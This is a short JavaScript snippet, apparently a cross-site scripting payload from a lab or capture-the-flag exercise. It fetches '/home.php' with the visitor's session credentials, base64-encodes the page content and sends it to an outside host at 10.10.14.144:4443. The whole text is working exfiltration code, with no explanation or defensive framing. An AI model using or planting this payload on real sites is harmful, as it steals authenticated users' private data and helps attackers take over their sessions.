var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
